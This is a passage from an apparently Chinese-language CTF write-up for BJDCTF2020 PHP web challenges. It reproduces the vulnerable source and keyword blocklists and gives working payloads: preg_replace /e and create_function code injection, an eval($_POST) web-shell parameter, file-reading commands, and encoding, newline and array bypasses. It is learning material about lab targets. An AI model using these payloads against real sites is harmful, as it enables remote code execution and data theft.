</span></span><span class=line><span class=cl>Origin: http://9e7f59cc-c72f-4520-8e03-fe9eb68fad3e.node5.buuoj.cn:81
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Referer: http://9e7f59cc-c72f-4520-8e03-fe9eb68fad3e.node5.buuoj.cn:81/
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>I have a dream
</span></span></code></pre></td></tr></table></div></div><p>但是如果用<code>data://</code>协议的话</p><p>直接传这个就可以了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?text=data:text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php
</span></span></code></pre></td></tr></table></div></div><p><code>next.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$id</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$id</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>complex</span><span class=p>(</span><span class=nv>$re</span><span class=p>,</span> <span class=nv>$str</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>preg_replace</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;/(&#39;</span> <span class=o>.</span> <span class=nv>$re</span> <span class=o>.</span> <span class=s1>&#39;)/ei&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;strtolower(&#34;\\1&#34;)&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nv>$str</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_GET</span> <span class=k>as</span> <span class=nv>$re</span> <span class=o>=&gt;</span> <span class=nv>$str</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>complex</span><span class=p>(</span><span class=nv>$re</span><span class=p>,</span> <span class=nv>$str</span><span class=p>)</span><span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>getFlag</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=o>@</span><span class=k>eval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里是有一个洞的,正则替换函数原型</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])
</span></span><span class=line><span class=cl>漏洞条件:
</span></span><span class=line><span class=cl>/e修正符修饰下，preg_replace中的第二个参数将当作php代码执行。
</span></span></code></pre></td></tr></table></div></div><p>实验一下,直接借用师傅的代码了哦</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;t&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/test/&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;t&#39;</span><span class=p>],</span> <span class=s1>&#39;Just test&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/bjdctf2020/QQ20240812-120750.png width=733 height=744 srcset="/p/bjdctf2020/QQ20240812-120750_hu_cb57325aacd7344d.png 480w, /p/bjdctf2020/QQ20240812-120750_hu_307025bafa8dd529.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=98 data-flex-basis=236px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;t&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/test/e&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;t&#39;</span><span class=p>],</span> <span class=s1>&#39;Just test&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个版本比较低,所以我就没浮现了,本题是<code>PHP5.6.40</code></p><p>那么回到题目</p><p><code>strtolower</code>函数可以将大写转小写</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;strtolower(&#34;\\1&#34;)&#39;,结果是，任何匹配正则表达式的捕获组内容都会被转换为小写。
</span></span></code></pre></td></tr></table></div></div><p>那么我们绕过</p><p>正则中的参数我们就得填写为<code>.*</code>或者<code>\S+</code></p><ol><li><code>.</code>匹配除换行符之外的任意字符；</li><li><code>\S</code>匹配任何非空白字符。等价于 <code>[^ \f\n\r\t\v]</code>；</li><li><code>+</code>匹配一次或多次,即<code>{1,}</code>。</li></ol><p>但是GET方式传的字符串,php里会把参数名里的特殊字符转为下划线<code>_</code></p><p>那么<code>.</code>会被替换成<code>_</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://9e7f59cc-c72f-4520-8e03-fe9eb68fad3e.node5.buuoj.cn:81/next.php?\S*=${getFlag()}&amp;cmd=echo `tac /f*`;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://9e7f59cc-c72f-4520-8e03-fe9eb68fad3e.node5.buuoj.cn:81/next.php?\S%2b=${getFlag()}&amp;cmd=echo `tac /f*`;
</span></span></code></pre></td></tr></table></div></div><p>这里有部分绕过,所以我们可以写🐎,但是不带引号即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://9e7f59cc-c72f-4520-8e03-fe9eb68fad3e.node5.buuoj.cn:81/next.php?\S%2b=${eval($_POST[a])}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST:
</span></span><span class=line><span class=cl>a=echo `ls /`;
</span></span></code></pre></td></tr></table></div></div><h1 id=bjdctf2020ezphp>[BJDCTF2020]EzPHP</h1><p>终于不是<code>phar</code>反序列化了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>&lt;!-- Here is the real page =w= --&gt;
</span></span><span class=line><span class=cl>&lt;!-- GFXEIM3YFZYGQ4A= --&gt;
</span></span></code></pre></td></tr></table></div></div><p>base32<code>/1nD3x.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=s2>&#34;1nD3x.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$shana</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;shana&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$passwd</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;passwd&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$arg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$code</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&#34;|\&#39;|log/i&#39;</span><span class=p>,</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;QUERY_STRING&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s1>&#39;You seem to want to do something bad?&#39;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/http|https/i&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^aqua_is_cute$/&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;debu&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;debu&#39;</span><span class=p>]</span> <span class=o>!==</span> <span class=s1>&#39;aqua_is_cute&#39;</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>        <span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>];</span> 
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Neeeeee! Good Job!&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;fxck you! What do you want to do ?!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$_REQUEST</span> <span class=k>as</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/[a-zA-Z]/i&#39;</span><span class=p>,</span> <span class=nv>$value</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;fxck you! I hate English!&#39;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>    <span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$file</span><span class=p>)</span> <span class=o>!==</span> <span class=s1>&#39;debu_debu_aqua&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$shana</span><span class=p>)</span> <span class=o>===</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$passwd</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$shana</span> <span class=o>!=</span> <span class=nv>$passwd</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nx>extract</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;flag&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Very good! you know my password. But what is flag?&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[a-z0-9]*$/isD&#39;</span><span class=p>,</span> <span class=nv>$code</span><span class=p>)</span> <span class=o>||</span> 
</span></span><span class=line><span class=cl><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&#34;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;</span><span class=p>,</span> <span class=nv>$arg</span><span class=p>)</span> <span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&#34;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>include</span> <span class=s2>&#34;flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$code</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$arg</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>还是挺长的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&#34;|\&#39;|log/i&#39;</span><span class=p>,</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;QUERY_STRING&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s1>&#39;You seem to want to do something bad?&#39;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>if($_SERVER)</code>不对<code>payload</code>进行<code>url</code>编码但是普通的传参会,所以直接编码即可绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/http|https/i&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^aqua_is_cute$/&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;debu&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;debu&#39;</span><span class=p>]</span> <span class=o>!==</span> <span class=s1>&#39;aqua_is_cute&#39;</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>        <span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>];</span> 
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Neeeeee! Good Job!&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;fxck you! What do you want to do ?!&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>第二层换行符(%0a)就可以绕过了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$_REQUEST</span> <span class=k>as</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/[a-zA-Z]/i&#39;</span><span class=p>,</span> <span class=nv>$value</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;fxck you! I hate English!&#39;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>    <span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> 
</span></span></code></pre></td></tr></table></div></div><p>第三层<code>$_REQUEST</code>特性:变量<code>post</code>值会优先于<code>get</code>,所以<code>post</code>一个数字就绕过了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$file</span><span class=p>)</span> <span class=o>!==</span> <span class=s1>&#39;debu_debu_aqua&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>这个用data协议绕过即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>data://text/plain,debu_debu_aqua
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$shana</span><span class=p>)</span> <span class=o>===</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$passwd</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$shana</span> <span class=o>!=</span> <span class=nv>$passwd</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nx>extract</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;flag&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Very good! you know my password. But what is flag?&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这一层数组绕过就行了,很常见</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[a-z0-9]*$/isD&#39;</span><span class=p>,</span> <span class=nv>$code</span><span class=p>)</span> <span class=o>||</span> 
</span></span><span class=line><span class=cl><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&#34;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;</span><span class=p>,</span> <span class=nv>$arg</span><span class=p>)</span> <span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&#34;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>include</span> <span class=s2>&#34;flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$code</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$arg</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>最后一层<code>create_function()</code>代码注入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://bf3b327c-71aa-4d54-8368-fac17158dfbb.node5.buuoj.cn:81/1nD3x.php?file=data://text/plain,debu_debu_aque&amp;debu=aque_is_cute%0a&amp;shana[]=1&amp;passwd[]=2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>debu=1&amp;file=1
